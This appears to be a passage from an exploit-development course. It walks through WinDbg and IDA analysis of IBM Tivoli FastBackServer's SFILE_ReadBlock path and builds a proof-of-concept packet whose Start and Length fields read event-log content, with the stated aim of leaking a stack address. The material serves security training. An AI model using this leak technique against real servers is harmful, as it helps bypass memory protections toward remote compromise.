As shown in previous modules, the input string must contain the same text as the format string for sscanf to correctly parse it. This means that we must modify the first part of the psCommandBuffer to contain the format string and insert values associated with the decimal format string specifiers.
Listing 39 shows the updated psCommandBuffer.
# psCommandBuffer
buf += b"FileType: %d ,Start: %d, Length: %d" % (1, 0x100, 0x200)  
buf += b"B" * 0x100 
buf += b"C" * 0x100 
Listing 39 - Updated psCommandBuffer
We'll use the required value of "1" along with 0x100 and 0x200 for the three decimal values that are parsed from the input string. Choosing different values for each makes it easier to find where each of them is used later.
Next, we can set a breakpoint on the call instruction into sscanf and send the updated packet.
0:001> bc *

0:001> bp FastBackServer!FXCLI_OraBR_Exec_Command+0x499b

0:001> g
Breakpoint 0 hit
eax=0db6a738 ebx=060fae50 ecx=0db6a73c edx=0dbb3b30 esi=060fae50 edi=00669360
eip=00570e51 esp=0db5e320 ebp=0dbbfe98 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!FXCLI_OraBR_Exec_Command+0x499b:
00570e51 e8cf660f00      call    FastBackServer!sscanf (00667525)

0:001> dds esp L5
0db5e320  0dbb3b30
0db5e324  00858598 FastBackServer!FX_CLI_JavaVersion+0x1f80
0db5e328  0db6a73c
0db5e32c  0db6a738
0db5e330  0db6a734

0:001> da poi(esp)
0dbb3b30  "FileType: 1 ,Start: 256, Length:"
0dbb3b50  " 512BBBBBBBBBBBBBBBBBBBBBBBBBBBB"
0dbb3b70  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
0dbb3b90  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
0dbb3bb0  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
0dbb3bd0  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
0dbb3bf0  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
0dbb3c10  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
0dbb3c30  ""
Listing 40 - Updated arguments for sscanf
We'll note that our input buffer now contains a valid string. The three output buffers for sscanf, given by the three-argument pointers, are also highlighted in the listing above.
Once we step over the call to sscanf the three decimal values are copied into the output buffers, as shown in Listing 41.
0:001> p
eax=00000003 ebx=060fae50 ecx=0db5e2f8 edx=0db5e2f8 esi=060fae50 edi=00669360
eip=00570e56 esp=0db5e320 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FXCLI_OraBR_Exec_Command+0x49a0:
00570e56 83c414          add     esp,14h

0:001> dd 0db6a73c L1
0db6a73c  00000001

0:001> dd 0db6a738 L1
0db6a738  00000100

0:001> dd 0db6a734 L1
0db6a734  00000200
Listing 41 - Parsed values from sscanf
With the decimal value 1 parsed correctly, let's clear the comparison and continue towards the basic block that calls SFILE_ReadBlock.
On the way there, we encounter multiple checks that use the two other parsed decimal values. Let's make a note of this and check it later. We can continue until we reach the call:
eax=018943a8 ebx=060fae50 ecx=00000100 edx=00000200 esi=060fae50 edi=00669360
eip=00570f03 esp=0db5e324 ebp=0dbbfe98 iopl=0         nv up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
FastBackServer!FXCLI_OraBR_Exec_Command+0x4a4d:
00570f03 e8008ef2ff      call    FastBackServer!SFILE_ReadBlock (00499d08)

0:001> dds esp L4
0db5e324  00000100
0db5e328  018943a8
0db5e32c  00000200
0db5e330  00a99f40 FastBackServer!EventLOG_sSFILE
Listing 42 - Arguments for SFILE_ReadBlock
From the arguments supplied to SFILE_ReadBlock, shown in Listing 42, we find that only the first and third arguments are under our control.
We have succeeded in reaching the correct function with arguments that seem valid. Next, we will examine exactly what the SFILE_ReadBlock function does.
Exercise
1.	Follow and repeat the analysis to obtain a proof of concept that triggers the correct opcode and passes the checks.
1 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/fread/
11.3.3. Read From an Index
In this section, we will analyze what the SFILE_ReadBlock function does, and what the supplied arguments represent.
We'll start by stepping into SFILE_ReadBlock. After some initial checks, we reach a call to SFILE_S_FindFileIndexForRead, as given in Figure 24.
 
Figure 24: Call to SFILE_S_FindFileIndexForRead
Given the name of the function and the goal of reading from the event log, it seems likely that SFILE_S_FindFileIndexForRead will find an index that determines which entries can be read.
Let's move execution to this point in WinDbg and inspect the arguments to the function.
0:006> bp FastBackServer!SFILE_ReadBlock+0xa8

0:006> g
Breakpoint 1 hit
...
eax=00000100 ebx=060fae50 ecx=00a99f40 edx=0db5e318 esi=060fae50 edi=00669360
eip=00499db0 esp=0db5e0ec ebp=0db5e31c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!SFILE_ReadBlock+0xa8:
00499db0 e807feffff      call    FastBackServer!SFILE_S_FindFileIndexForRead (00499bbc)

0:001> dds esp L4
0db5e0ec  00a99f40 FastBackServer!EventLOG_sSFILE
0db5e0f0  00000100
0db5e0f4  0db5e318
0db5e0f8  0db5e108
Listing 43 - Arguments for SFILE_S_FindFileIndexForRead
The only argument we control is the second formatted decimal value. We'll recall that in the format string, it was labeled Start.
buf += b"FileType: %d ,Start: %d, Length: %d" % (1, 0x100, 0x200)
Listing 44 - Format string in our PoC
This suggests that the value directs where SFILE_ReadBlock will read from in the event log.
Before moving into the function, we should note that its return value determines whether SFILE_ReadBlock triggers the JNZ. Figure 25 shows the graph overview of SFILE_ReadBlock.
 
Figure 25: Failure path inside SFILE_ReadBlock
The highlighted portion in the figure above shows the path if the jump is not taken, which leads to a premature exit from SFILE_ReadBlock.
To go further into SFILE_ReadBlock, the return value from SFILE_S_FindFileIndexForRead must be non-zero.
Stepping into SFILE_S_FindFileIndexForRead, we encounter some initial bound checks on the Start value. Next we'll enter a large loop, as shown in Figure 26.
 
Figure 26: Loop inside SFILE_S_FindFileIndexForRead
The logic within this loop has multiple implications, so let's start at a high level and then dig into some of the details.
We already know that SFILE_S_FindFileIndexForRead must exit with a non-zero result. Inspecting the code in the three red color-coded basic blocks on the right-hand side would show that they return a zero result.
This leaves only one successful exit from the loop, the green color-coded basic block on the left-hand side in Figure 26.
Now that we have a general roadmap of where we want to end up, let's recall a couple of facts we discovered earlier. We found multiple event log files, and the entry containing the leaked stack address was added as the newest entry in the file with the number suffix of 40.
Listing 45 repeats the prior file listings for the event log directory.
C:\Tools> dir C:\ProgramData\Tivoli\TSM\FastBack\server
 Volume in drive C has no label.
 Volume Serial Number is 4097-9145

 Directory of C:\ProgramData\Tivoli\TSM\FastBack\server

...
26/04/2020  19.21         2.560.003 FAST_BACK_SERVER030.sf
26/04/2020  20.25         2.560.003 FAST_BACK_SERVER031.sf
27/04/2020  08.35         2.560.003 FAST_BACK_SERVER032.sf
27/04/2020  09.39         2.560.003 FAST_BACK_SERVER033.sf
27/04/2020  10.44         2.560.003 FAST_BACK_SERVER034.sf
27/04/2020  11.48         2.560.003 FAST_BACK_SERVER035.sf
27/04/2020  12.52         2.560.003 FAST_BACK_SERVER036.sf
27/04/2020  13.57         2.560.003 FAST_BACK_SERVER037.sf
27/04/2020  15.01         2.560.003 FAST_BACK_SERVER038.sf
27/04/2020  16.06         2.560.003 FAST_BACK_SERVER039.sf
27/04/2020  22.13           622.851 FAST_BACK_SERVER040.sf
...
Listing 45 - Multiple event log files of same size
From the listing, we'll note that all event log files with a suffix lower than 40 are the same size. We will also find, if we recheck the event logs present in the directory multiple times while the application is running, that no file with a suffix greater than 40 exists. On the contrary, event files with decreasing numerical suffixes appear.
Given these facts, our initial thought is that the first log file to be created is the log file with a suffix of 40. When it reaches its maximum size, it is renamed to 39, and a new log file with a suffix of 40 is created. This would continue until the suffix value reaches zero, and then it would eventually be overwritten by newer data.
We are currently interested in reading from the newest file, and the only argument we can control is the Start value. It makes sense that this value will control where we read from.
With a high-level understanding of how the event log works, let's explore what's happening inside the loop.
Just before entering the loop, we find the uppermost basic block displayed in Figure 27.
 
Figure 27: Initial loop condition
In this basic block, a value is moved into EDX and subsequently onto the stack. It is then used as a comparison against 0.
To discover the value at runtime, we will step into SFILE_S_FindFileIndexForRead with WinDbg and go to the comparison as shown in Listing 46.
eax=0005fe36 ebx=060fae50 ecx=00a99f40 edx=00000028 esi=060fae50 edi=00669360
eip=00499c12 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!SFILE_S_FindFileIndexForRead+0x56:
00499c12 83bdccfdffff00  cmp     dword ptr [ebp-234h],0 ss:0023:0db5deb0=00000028
Listing 46 - Comparison on file suffix
We'll find the value 0x28 or decimal 40, which is the maximum suffix value.
The comparison in this basic block controls the iterations through the loop. It is likely the assembly code stemming from a compiled C-style while loop, as illustrated in Listing 47.
while(file_suffix > 0)
{
 // Action in loop
}
Listing 47 - C pseudocode for while loop
The loop starts with the maximum suffix value of the event log files, so we can suspect that the purpose of the loop is to determine which log file to read from.
To help in our analysis, let's try to put ourselves into the shoes of the developer. One way to programmatically figure out which file to read from is to use the Start value as an index.
Listing 48 shows an example of C pseudocode for accomplishing this.
index = total log size 
while(file_suffix > 0)
{
  index = index - sizeof(current log file)
  if(Start value >= index)
  {
    // We found the right log file
  }
  go to next log file
}
Listing 48 - C pseudocode for function of loop
We'll begin by getting the size of all log files, then subtracting the size of the current log file and checking if the supplied Start value is greater. If it is, we want to read from the current log file. If it is not greater, we'll go to the next log file.
Programming knowledge can help us understand how a developer might implement a specific piece of functionality.
Let's test if our pseudocode is accurate by going through the contents of the loop.
Inside the loop, we will first come across a call to the snprintf1 format string function, as shown in Figure 28.
 
Figure 28: Call to snprintf
To better understand this call, the function prototype for snprintf is given below:
int snprintf ( char * s, size_t n, const char * format, ... );
Listing 49 - Function prototype for snprintf
The first two arguments are the destination buffer and the maximum number of bytes to be used in the buffer. This is followed by the format string, in this case, "%s%03u%s" as displayed in Figure 28, and the associated arguments for the format string specifiers.
Let's step to the call in WinDbg to check the supplied arguments.
eax=0db5dedc ebx=060fae50 ecx=00000028 edx=00a99f40 esi=060fae50 edi=00669360
eip=00499c40 esp=0db5de94 ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!SFILE_S_FindFileIndexForRead+0x84:
00499c40 e866021c00      call    FastBackServer!ml_snprintf (00659eab)

0:001> dds esp L6
0db5de94  0db5dedc
0db5de98  00000208
0db5de9c  00798c28 FastBackServer!securityLevel+0x51e4
0db5dea0  00a99f40 FastBackServer!EventLOG_sSFILE
0db5dea4  00000028
0db5dea8  00798c24 FastBackServer!securityLevel+0x51e0

0:001> da 00798c28
00798c28  "%s%03u%s"

0:001> da 00a99f40
00a99f40  "C:/ProgramData/Tivoli/TSM/FastBa"
00a99f60  "ck/server/FAST_BACK_SERVER"
Listing 50 - Format string to create file name
Given the arguments, it appears that snprintf creates the full log filename for each iteration of the loop.
We can step over the call to find the file name in the first iteration of the loop.
0:001> p
eax=00000040 ebx=060fae50 ecx=0db5de4c edx=0db5df1b esi=060fae50 edi=00669360
eip=00499c45 esp=0db5de94 ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!SFILE_S_FindFileIndexForRead+0x89:
00499c45 83c418          add     esp,18h

0:001> da 0db5dedc
0db5dedc  "C:/ProgramData/Tivoli/TSM/FastBa"
0db5defc  "ck/server/FAST_BACK_SERVER040.sf"
0db5df1c  ""
Listing 51 - Full file name is created
From the contents of the output buffer, we find the full file name for the event log file with the maximum suffix, as expected.
To move forward with our analysis, we'll continue inside the same basic block and find that a call to the HANDLE_MGR_Open function takes place, as shown in Figure 29.
 
Figure 29: Open handle to log file
This is another custom function, but given its name and the fact that we are hoping to read from a file, it makes sense that HANDLE_MGR_Open will likely open a handle to the log file.
We'll also notice a subsequent check against the value 0xFFFFFFFF, which is the typical error value of an invalid handle (INVALID_HANDLE_VALUE).
We can step to this call in WinDbg, as given in Listing 52.
eax=00000040 ebx=060fae50 ecx=0db5dedc edx=0db5df1b esi=060fae50 edi=00669360
eip=00499c5d esp=0db5dea0 ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!SFILE_S_FindFileIndexForRead+0xa1:
00499c5d e8ac89feff      call    FastBackServer!HANDLE_MGR_Open (0048260e)

0:001> dds esp L3
0db5dea0  0db5dedc
0db5dea4  00000000
0db5dea8  00000001

0:001> da poi(esp)
0db5dedc  "C:/ProgramData/Tivoli/TSM/FastBa"
0db5defc  "ck/server/FAST_BACK_SERVER040.sf"
0db5df1c  ""

0:001> p
eax=0000015e ebx=060fae50 ecx=0db5de28 edx=77e71670 esi=060fae50 edi=00669360
eip=00499c62 esp=0db5dea0 ebp=0db5e0e4 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
FastBackServer!SFILE_S_FindFileIndexForRead+0xa6:
00499c62 83c40c          add     esp,0Ch
Listing 52 - Open handle to log file
After we step over the call, we'll note that EAX contains a value different from the invalid handle. This means that we pass the comparison and move to the next basic block.
Figure 30 shows the upper part of the next basic block.
 
Figure 30: Calculating an offset
First let's examine the call to HANDLE_MGR_fstat, which accepts the event log file name along with an output buffer.
While we don't know what this function does, Figure 30 shows us that the "size" field of the output buffer is used in the lower highlighted part.
Listing 53 shows the content of the output buffer before and after the call.
eax=0000015e ebx=060fae50 ecx=0db5de28 edx=0db5deb8 esi=060fae50 edi=00669360
eip=00499c89 esp=0db5dea4 ebp=0db5e0e4 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
FastBackServer!SFILE_S_FindFileIndexForRead+0xcd:
00499c89 e8f198feff      call    FastBackServer!HANDLE_MGR_fstat (0048357f)

0:001> dd poi(esp+4) L8
0db5deb8  00000000 00000000 00000000 00000000
0db5dec8  00000000 00000000 00000000 00000000

0:001> p
eax=00000000 ebx=060fae50 ecx=0db5de5c edx=77e71670 esi=060fae50 edi=00669360
eip=00499c8e esp=0db5dea4 ebp=0db5e0e4 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!SFILE_S_FindFileIndexForRead+0xd2:
00499c8e 83c408          add     esp,8

0:001> dd 0db5deb8 L8
0db5deb8  00000000 81b60000 00000001 00000000
0db5dec8  00000000 000ac603 5ea6e6ce 5ea8ad2a
Listing 53 - Call to HANDLE_MGR_fstat
We'll note that the output buffer has been populated with data. The highlighted DWORD at offset 0x14 into the buffer is important since it equates to the size field, as noted in Figure 30.
We can find the numerical value by single-stepping to the instruction where it's moved into EAX.
eax=00000001 ebx=060fae50 ecx=0db5de5c edx=77e71670 esi=060fae50 edi=00669360
eip=00499ca0 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!SFILE_S_FindFileIndexForRead+0xe4:
00499ca0 8b85e8fdffff    mov     eax,dword ptr [ebp-218h] ss:0023:0db5decc=000ac603
Listing 54 - Content of size field
To get an idea of what will happen next, let's recall the pseudocode for the loop, repeated below:
index = total log size 
while(file_suffix > 0)
{
  index = index - sizeof(current log file)
  if(Start value >= index)
  {
    // We found the right log file
  }
  go to next log file
}
Listing 55 - C pseudocode for function of loop
The application retrieves the size of the current log file, which must be subtracted from the total log file size. The result is then compared to the supplied Start value.
The lower part of the basic block we analyzed is shown in Figure 31.
 
Figure 31: Calculation and comparison of an offset
There's a lot happening in this basic block, so let's split the activity into four separate parts for analysis.
In the first highlighted part, the size of the current log file is moved into EAX. The CDQ2 instruction extends the sign bit of EAX into EDX. This means if the uppermost bit of EAX is set, EDX will be set to 0xFFFFFFFF. EDX will otherwise be set to 0.
mov     eax, [ebp+var_22C.st_size]
cdq
Listing 56 - Sign extension
Next, EDX is masked with 0xFF to extract the least significant byte as an unsigned integer. The result is added to EAX.
and     edx, 0FFh
add     eax, edx
Listing 57 - Conversion to unsigned integer
Finally, EAX is right-shifted by 8 bits through the SAR3 instruction. This is likely to convert the size to an index.
sar     eax, 8
Listing 58 - Right-shifting by 8 bits
Listing 59 shows the results of the calculation on the first iteration of the loop.
eax=00000001 ebx=060fae50 ecx=0db5de5c edx=77e71670 esi=060fae50 edi=00669360
eip=00499ca0 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!SFILE_S_FindFileIndexForRead+0xe4:
00499ca0 8b85e8fdffff    mov     eax,dword ptr [ebp-218h] ss:0023:0db5decc=000ac603

0:001> p
...
eax=00000ac6 ebx=060fae50 ecx=0db5de5c edx=00000000 esi=060fae50 edi=00669360
eip=00499cb2 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!SFILE_S_FindFileIndexForRead+0xf6:
00499cb2 8b95c8fdffff    mov     edx,dword ptr [ebp-238h] ss:0023:0db5deac=00000000
0:001> 
Listing 59 - Calculating index value of current log file
In this case, the size value of 0xac603 resulted in an index value of 0xac6, as stored in EAX.
With the index value of the current log file calculated, we'll move to the next highlighted portion of the basic block.
In this section, a value is retrieved into EDX, EAX is added to it, and it is written back to the same memory location.
mov     edx, [ebp+var_238]
add     edx, eax
mov     [ebp+var_238], edx
Listing 60 - Getting the accumulator value
This is essentially an accumulator to be used in the next iteration of the loop.
The third portion of the basic block retrieves the maximum index of the log into ECX and subtracts the current index, as shown in Listing 61.
mov     eax, dword ptr [ebp+arg_0]
mov     ecx, [eax+210h]
sub     ecx, [ebp+var_238]
Listing 61 - Calculating the index difference
We can observe this calculation in WinDbg.
eax=00000ac6 ebx=060fae50 ecx=0db5de5c edx=00000ac6 esi=060fae50 edi=00669360
eip=00499cc0 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!SFILE_S_FindFileIndexForRead+0x104:
00499cc0 8b4508          mov     eax,dword ptr [ebp+8] ss:0023:0db5e0ec={FastBackServer!EventLOG_sSFILE (00a99f40)}

0:001> p
eax=00a99f40 ebx=060fae50 ecx=0db5de5c edx=00000ac6 esi=060fae50 edi=00669360
eip=00499cc3 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!SFILE_S_FindFileIndexForRead+0x107:
00499cc3 8b8810020000    mov     ecx,dword ptr [eax+210h] ds:0023:00a9a150=0005fe36

0:001> p
eax=00a99f40 ebx=060fae50 ecx=0005fe36 edx=00000ac6 esi=060fae50 edi=00669360
eip=00499cc9 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!SFILE_S_FindFileIndexForRead+0x10d:
00499cc9 2b8dc8fdffff    sub     ecx,dword ptr [ebp-238h] ss:0023:0db5deac=00000ac6

0:001> p
eax=00a99f40 ebx=060fae50 ecx=0005f370 edx=00000ac6 esi=060fae50 edi=00669360
eip=00499ccf esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!SFILE_S_FindFileIndexForRead+0x113:
00499ccf 3b4d0c          cmp     ecx,dword ptr [ebp+0Ch] ss:0023:0db5e0f0=00000100
Listing 62 - Calculating index to start of current log file
Once the subtraction is done, ECX contains an index value to the start of the current log file.
In the last highlighted section, a comparison between the current log file index and the Start value is performed. We'll only exit the loop if our supplied value is larger than the current log file index.
While there are several calculations performed, the logic corresponds to our proposed pseudocode.
This understanding leaves us with a challenge. To obtain the leaked stack address, we'll need to read from the newest entries in the log file with suffix 40. We cannot predict which Start value is required, since it will depend on the amount of content in the event log.
We will solve this problem in a later section. For now, let's focus on obtaining any content from the event log and returning it to our Kali machine.
Exercise
1.	Follow and repeat the analysis to understand how the Start value works.
1 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/snprintf/
2 (Aldeid, 2016), https://www.aldeid.com/wiki/X86-assembly/Instructions/cdq
3 (Aldeid, 2019), https://www.aldeid.com/wiki/X86-assembly/Instructions/shr
11.3.4. Read From the Log
In the previous section, we learned how the Start value we supply determines which log file is used. Next, let's find out if the content is read from the event log at all.
Our supplied Start value is quite small compared to the total index value. As a result, we expect one of the oldest log files to be chosen. This will have the lowest number in the suffix.
Let's continue our analysis of the loop inside SFILE_S_FindFileIndexForRead. To determine what our Start value corresponds to, we can set a breakpoint at FastBackServer!SFILE_S_FindFileIndexForRead+0x118 where we exit the loop.
0:001> bp FastBackServer!SFILE_S_FindFileIndexForRead+0x118

0:001> g
Breakpoint 1 hit
eax=00a99f40 ebx=060fae50 ecx=00000000 edx=0005fe36 esi=060fae50 edi=00669360
eip=00499cd4 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei ng nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287
FastBackServer!SFILE_S_FindFileIndexForRead+0x118:
00499cd4 8b5510          mov     edx,dword ptr [ebp+10h] ss:0023:0db5e0f4=0db5e318
Listing 63 - Exiting the loop
The algorithm has now found the correct log file, but not the location inside of it. The Start value we supplied was only compared to the index value of the start of the log file. The last step is to find the index into the specific file.
Since we supplied the low value of 0x100, a good assumption is that we will be reading from the first event log file. The suffix will depend on how many log files have been created. If the application has been running for a while, this suffix may be as low as 001.
As the last step of SFILE_S_FindFileIndexForRead, we find where in the selected log file we should read from. This location is also based on the Start value. In our current example, we used the small Start value of 0x100. This value will force a selection of the oldest log file that starts at the index value of 0. This means the Start value is also the index inside the specified file.
As another example, let's imagine that the event log file with a suffix of 020 starts at the index value 0x20000 and we provide a Start value of 0x20200. In our example, SFILE_S_FindFileIndexForRead would determine that it should read at index 0x200 inside that log file.
After returning to SFILE_ReadBlock, we'll encounter a few checks followed by a call to ml_fopen, as displayed in Figure 32.
 
Figure 32: Opening a handle to the log file
Reviewing this call in WinDbg, we can inspect the supplied file name and verify which suffix was chosen.
eax=00000040 ebx=060fae50 ecx=0db5e09c edx=0db5e110 esi=060fae50 edi=00669360
eip=00499e18 esp=0db5e0f4 ebp=0db5e31c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!SFILE_ReadBlock+0x110:
00499e18 e897031c00      call    FastBackServer!ml_fopen (0065a1b4)

0:001> da poi(esp)
0db5e110  "C:/ProgramData/Tivoli/TSM/FastBa"
0db5e130  "ck/server/FAST_BACK_SERVER001.sf"
0db5e150  ""
Listing 64 - Log file with suffix 001 is chosen
In this case, FastBackServer has been installed for an extended duration, so all 40 event log files have been created and the Start value of 0x100 corresponds to the file with a suffix of 001.
If the application has been running for a long time, our Start value might not exist because it's too small.
With the file selected and opened, we need to set the position to read from. In the following basic block, a call to fseek1 is performed.
 
Figure 33: Setting read position in the log file
To understand what fseek does, let's start by analyzing the function prototype, as given in Listing 65.
int fseek ( 
  FILE * stream, 
  long int offset, 
  int origin );
Listing 65 - Function prototype for fseek
The API accepts three arguments. The first (stream) is a handle to the file, the second (offset) is the offset into the file, and the last (origin) is the position the offset is counted from.
When fseek finishes executing, the position to read from using an API, like fread, is updated. This position is set through the second and third arguments.
To obtain the current values in WinDbg, let's step to the call into fseek where we can display the arguments.
eax=00010000 ebx=060fae50 ecx=008c8408 edx=77e71670 esi=060fae50 edi=00669360
eip=00499e47 esp=0db5e0f0 ebp=0db5e31c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!SFILE_ReadBlock+0x13f:
00499e47 e8d7ff1c00      call    FastBackServer!fseek (00669e23)

0:001> dds esp L3
0db5e0f0  008c8408 FastBackServer!_iob+0x80
0db5e0f4  00010000
0db5e0f8  00000000
Listing 66 - Arguments for fseek
The output above shows that the Start value we supplied is converted to 0x10000. This equates to a left-shift of 8 bits, after which the value is supplied as the offset argument for fseek.
At this point, we've located the code that selects the desired event log file and calculates the offset into it. We then found a call to ml_fopen that gets a handle to the log file. Finally, we found a call to fseek that sets the position inside the file.
Our last step is to read from the file.
If we continue our analysis of the code in IDA Pro, we find that this is done with fread in a subsequent basic block, as shown in Figure 19.
 
Figure 19: Reading from the log file
fread uses the position set by fseek to read data. The amount of data read is not yet clear to us.
When we called into SFILE_ReadBlock, values parsed from the format string were used as arguments. The format string is repeated in Listing 67.
buf += b"FileType: %d ,Start: %d, Length: %d" % (1, 0x100, 0x200)
Listing 67 - Format string in our PoC
The first value we dealt with inside SFILE_ReadBlock was the Start value. The second value, Length, was provided to SFILE_ReadBlock as the third argument.
The Start value determines which log file and which offset into it we will read from. The Length value appears in the basic block shown in Figure 19 because it's stored at EBP+arg_8, which is the third argument for SFILE_ReadBlock.
After some modifications, the Length value is supplied as the third argument to fread, which represents the number of elements to read.
To examine the values supplied to fread, we'll let WinDbg catch up, as shown in Listing 68.
eax=008c8408 ebx=060fae50 ecx=00000020 edx=77e71670 esi=060fae50 edi=00669360
eip=00499e6b esp=0db5e0f8 ebp=0db5e31c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!SFILE_ReadBlock+0x163:
00499e6b 8b4d10          mov     ecx,dword ptr [ebp+10h] ss:0023:0db5e32c=00000200

0:001> p
eax=008c8408 ebx=060fae50 ecx=00000200 edx=77e71670 esi=060fae50 edi=00669360
eip=00499e6e esp=0db5e0f8 ebp=0db5e31c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!SFILE_ReadBlock+0x166:
00499e6e c1e108          shl     ecx,8

0:001> p
...
eax=008c8408 ebx=060fae50 ecx=00020000 edx=018943a8 esi=060fae50 edi=00669360
eip=00499e84 esp=0db5e0ec ebp=0db5e31c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!SFILE_ReadBlock+0x17c:
00499e84 e8b9d91c00      call    FastBackServer!fread (00667842)

0:001> dds esp L4
0db5e0ec  018943a8
0db5e0f0  00000001
0db5e0f4  00020000
0db5e0f8  008c8408 FastBackServer!_iob+0x80
Listing 68 - Arguments for fread
First, we'll notice that the Length value is left-shifted by 8 bits, so our input value of 0x200 becomes 0x20000. Just before calling fread, we find that this value is supplied to fread as the number of elements to read.
We'll inspect the output buffer for fread after the call to it has completed, as shown in Listing 69.
0:001> p
eax=00020000 ebx=060fae50 ecx=00000020 edx=00020000 esi=060fae50 edi=00669360
eip=00499e89 esp=0db5e0ec ebp=0db5e31c iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
FastBackServer!SFILE_ReadBlock+0x181:
00499e89 83c410          add     esp,10h

0:001> da 018943a8
018943a8  "  .[Apr 22 00:10:04:998](15b4)->"
018943c8  "I4.GENERAL  .:.|tOA             "
018943e8  "              |     0|200000|199"
01894408  "000|199000|      0|   17496|    "
01894428  "0.00|    0.17|PRIORITY|         "
01894448  "                                "
01894468  "                                "
01894488  "                                "
018944a8  "  .[Apr 22 00:10:05:013](15b4)->"
018944c8  "I4.GENERAL  .:.|----------------"
018944e8  "--------------|------|------|---"
01894508  "---|------|-------|--------|----"
Listing 69 - Content from the log file has been read
We can observe that content similar to that which we found in the event log earlier has been read into the output buffer.
To verify that the content of the buffer does indeed come from the log file, we can use the Select-String cmdlet2 to locate the same content inside the log file with the lowest suffix, in our case FAST_BACK_SERVER001.sf.
PS C:\Tools> Select-String C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER001.sf -Pattern '[Apr 22 00:10:04:998]' -SimpleMatch

C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER001.sf:255:[Apr 22 00:10:04:998](15b4)->I4.GENERAL    :       |
                         |      |      |      |Abort |       |        |MB      |MB      |Type    |

C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER001.sf:256:[Apr 22 00:10:04:998](15b4)->I4.GENERAL    :       
|------------------------------|------|------|------|------|-------|--------|--------|--------|--------|

C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER001.sf:257:[Apr 22 00:10:04:998](15b4)->I4.GENERAL    :       |tOA
                         |     0|200000|199000|199000|      0|   17496|    0.00|    0.17|PRIORITY|
Listing 70 - Search for string in event log file
The highlighted portion of Listing 70 confirms that the content read into the output buffer by fread does indeed come from the correct event log file. Excellent!
In this section, we managed to read content from the event log based on the Start and Length values we supplied. The last step is to find out how to return the content that was read to us.
Exercise
1.	Follow and repeat the analysis to understand how the Length value works and read content from the event log.
1 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/fseek/
